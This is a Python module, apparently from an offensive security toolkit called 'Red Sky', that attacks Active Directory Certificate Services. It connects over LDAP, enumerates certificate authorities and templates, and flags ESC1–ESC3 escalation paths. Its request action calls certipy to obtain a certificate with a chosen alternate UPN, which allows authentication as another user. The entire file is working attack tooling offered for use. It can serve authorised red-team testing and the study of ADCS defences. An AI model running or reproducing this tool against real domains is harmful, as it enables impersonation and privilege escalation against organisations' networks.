# language: Python, file: Program/ad_attack/adcs.py, target: Red Sky ad_attack — ADCS abuse
# Enumerates Certificate Authorities and templates, identifies known
# escalation paths (ESC1 through ESC8), and requests certificates that
# allow authentication as another user.

import base64
import json
import sys
import time
from pathlib import Path
from typing import Dict, List, Optional

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


AD_DIR = OUTPUT_DIR / "ad_attack"

# ESC technique reference — one line each so the report is self-explanatory
ESC_DESCRIPTIONS = {
    "ESC1": "Template allows requester-supplied subject + client auth EKU. Enroll as any user.",
    "ESC2": "Template allows any purpose EKU (or no EKU). Same as ESC1 with looser constraints.",
    "ESC3": "Template has Certificate Request Agent EKU. Enroll on behalf of another user.",
    "ESC4": "Template has weak ACLs — you can modify it to enable ESC1/ESC2.",
    "ESC5": "Misconfigured PKI object ACLs (CA, NTAuthCertificates, or enrollment service container).",
    "ESC6": "CA has EDITF_ATTRIBUTESUBJECTALTNAME2 — any template can supply SAN.",
    "ESC7": "CA officer can issue/manage certificates — enroll on behalf of anyone.",
    "ESC8": "NTLM relay to HTTP enrollment endpoint (certsrv).",
}


def _connect(host, domain, user, passwd, ssl=False):
    try:
        import ldap3
    except ImportError:
        print_err("ldap3 not installed")
        return None, None
    port = 636 if ssl else 389
    server = ldap3.Server(host, port=port, get_info=ldap3.ALL, connect_timeout=10)
    try:
        conn = ldap3.Connection(
            server,
            user=f"{domain}\\{user}" if "\\" not in user else user,
            password=passwd,
            authentication=ldap3.NTLM,
            auto_bind=True,
            receive_timeout=15,
        )
    except Exception as e:
        print_err(f"LDAP bind failed: {e}")
        return None, None
    return server, conn


def _base_dn(domain):
    return ",".join(f"DC={p}" for p in domain.split(".") if p)


def collect_cas(conn, base):
    """Find certificate authority objects under CN=Configuration."""
    out = []
    conn.search(
        "CN=Configuration," + base,
        "(objectClass=pKIEnrollmentService)",
        attributes=["cn", "dNSHostName", "cACertificate", "certificateTemplates",
                    "distinguishedName"],
        paged_size=500,
    )
    for e in conn.entries:
        out.append({
            "name": str(e["cn"].value or ""),
            "dns": str(e["dNSHostName"].value or ""),
            "dn": e.entry_dn,
            "templates": [str(x) for x in (e["certificateTemplates"].values if e["certificateTemplates"] else [])],
        })
    return out


def collect_templates(conn, base):
    """Enumerate certificate templates and flag ESC-relevant properties."""
    out = []
    conn.search(
        "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration," + base,
        "(objectClass=pKICertificateTemplate)",
        attributes=[
            "cn", "distinguishedName", "msPKI-Certificate-Name-Flag",
            "msPKI-Enrollment-Flag", "pKIExtendedKeyUsage", "nTSecurityDescriptor",
            "msPKI-Certificate-Application-Policy", "msPKI-RA-Signature",
            "msPKI-Template-Schema-Version", "pKIExpirationPeriod",
        ],
        paged_size=500,
    )
    for e in conn.entries:
        name = str(e["cn"].value or "")
        name_flag = int(e["msPKI-Certificate-Name-Flag"].value or 0)
        enroll_flag = int(e["msPKI-Enrollment-Flag"].value or 0)
        eku = [str(x) for x in (e["pKIExtendedKeyUsage"].values if e["pKIExtendedKeyUsage"] else [])]
        app_policy = [str(x) for x in (e["msPKI-Certificate-Application-Policy"].values if e["msPKI-Certificate-Application-Policy"] else [])]
        ra_sig = int(e["msPKI-RA-Signature"].value or 0)

        flags = []
        # ESC1: enrollee supplies subject AND client auth EKU
        client_auth = ("1.3.6.1.5.5.7.3.2" in eku) or ("1.3.6.1.5.5.7.3.2" in app_policy)
        any_purpose = ("2.5.29.37.0" in eku) or (not eku and client_auth)
        if (name_flag & 0x00000001) and client_auth and ra_sig == 0:
            flags.append("ESC1")
        if any_purpose and (name_flag & 0x00000001) and ra_sig == 0:
            flags.append("ESC2")
        # ESC3: Certificate Request Agent EKU
        if "1.3.6.1.4.1.311.20.2.1" in eku:
            flags.append("ESC3")
        # ESC4 is a permissions problem — flagged separately

        out.append({
            "name": name,
            "dn": e.entry_dn,
            "name_flag": name_flag,
            "enroll_flag": enroll_flag,
            "eku": eku,
            "app_policy": app_policy,
            "ra_signature": ra_sig,
            "flags": flags,
        })
    return out


def cmd_find(host, domain, user, passwd, ssl=False, out_file=""):
    AD_DIR.mkdir(parents=True, exist_ok=True)
    print_info(f"enumerating ADCS on {host}")
    print_kv("domain", domain)
    print()

    server, conn = _connect(host, domain, user, passwd, ssl)
    if not conn:
        return 1
    base = _base_dn(domain)

    print(f"{ARTERY}{BOLD}── certificate authorities{RESET}")
    cas = collect_cas(conn, base)
    print_kv("count", len(cas))
    for ca in cas:
        print(f"  {ARTERY}▓{RESET} {BONE}{ca['name']}{RESET}  {ASH}{ca['dns']}{RESET}")
    print()

    print(f"{ARTERY}{BOLD}── certificate templates{RESET}")
    templates = collect_templates(conn, base)
    print_kv("count", len(templates))

    exploitable = []
    for t in templates:
        if t["flags"]:
            exploitable.append(t)
            print(f"  {SCARLET}▓{RESET} {BONE}{t['name']}{RESET}  {SCARLET}{','.join(t['flags'])}{RESET}")
            for flag in t["flags"]:
                print(f"      {ASH}{flag}: {ESC_DESCRIPTIONS.get(flag, '')}{RESET}")

    if not exploitable:
        print(f"  {ASH}no template-level ESC flags found{RESET}")

    print()
    print(f"{ARTERY}{BOLD}── manual checks still needed{RESET}")
    print(f"  {ASH}ESC4 — template ACLs (use: certipy find -vulnerable){RESET}")
    print(f"  {ASH}ESC5 — PKI object ACLs{RESET}")
    print(f"  {ASH}ESC6 — CA flag EDITF_ATTRIBUTESUBJECTALTNAME2 (registry on CA){RESET}")
    print(f"  {ASH}ESC7 — CA officer rights{RESET}")
    print(f"  {ASH}ESC8 — NTLM relay to /certsrv (needs a live listener){RESET}")

    conn.unbind()

    out = Path(out_file) if out_file else AD_DIR / f"adcs_{domain}_{int(time.time())}.json"
    out.write_text(json.dumps({
        "domain": domain,
        "cas": cas,
        "templates": templates,
        "exploitable": [t["name"] for t in exploitable],
    }, indent=2, default=str))
    print()
    print_kv("saved", out)
    return 0


def cmd_request(host, domain, user, passwd, template, ca_name, alt_upn,
                ssl=False, out_file=""):
    """Request a certificate with an alternate UPN (SAN) using certipy."""
    import shutil
    if not shutil.which("certipy"):
        print_err("certipy not installed")
        print_info("  pip install --break-system-packages certipy-ad")
        print_info("certipy is the canonical tool for ADCS abuse — this module wraps it")
        return 1

    print_info(f"requesting cert for alt UPN {alt_upn}")
    print_kv("template", template)
    print_kv("ca", ca_name)
    print()

    cmd = [
        "certipy", "req",
        "-u", f"{user}@{domain}",
        "-p", passwd,
        "-ca", ca_name,
        "-template", template,
        "-upn", alt_upn,
        "-dc-ip", host,
    ]
    if ssl:
        cmd.append("-ldap-ssl")
    if out_file:
        cmd += ["-out", out_file]

    import subprocess
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
    except (subprocess.SubprocessError, FileNotFoundError) as e:
        print_err(f"certipy failed: {e}")
        return 1

    for line in (r.stdout + r.stderr).splitlines():
        print(f"  {ASH}{line[:140]}{RESET}")
    return 0 if r.returncode == 0 else 1


def run_cli(args):
    import argparse
    p = argparse.ArgumentParser(prog="redsky ad_attack adcs", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("action", nargs="?", default="find")
    p.add_argument("--dc", default="")
    p.add_argument("--domain", default="")
    p.add_argument("--user", default="")
    p.add_argument("--pass", dest="passwd", default="")
    p.add_argument("--ssl", action="store_true")
    p.add_argument("--out", default="")
    p.add_argument("--template", default="")
    p.add_argument("--ca", default="")
    p.add_argument("--upn", default="")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky ad_attack adcs <find|request> --dc DC --domain D --user U --pass P [--ssl]")
        return 2

    if ns.help:
        print_info("redsky ad_attack adcs find --dc DC --domain D --user U --pass P")
        print_info("redsky ad_attack adcs request --dc DC --domain D --user U --pass P --template T --ca CA --upn alt@dom")
        return 0

    if not all([ns.dc, ns.domain, ns.user, ns.passwd]):
        print_err("--dc --domain --user --pass are required")
        return 2

    if ns.action == "find":
        return cmd_find(ns.dc, ns.domain, ns.user, ns.passwd, ns.ssl, ns.out)
    if ns.action == "request":
        if not all([ns.template, ns.ca, ns.upn]):
            print_err("request needs --template --ca --upn")
            return 2
        return cmd_request(ns.dc, ns.domain, ns.user, ns.passwd,
                           ns.template, ns.ca, ns.upn, ns.ssl, ns.out)
    print_err(f"unknown adcs action: {ns.action}")
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
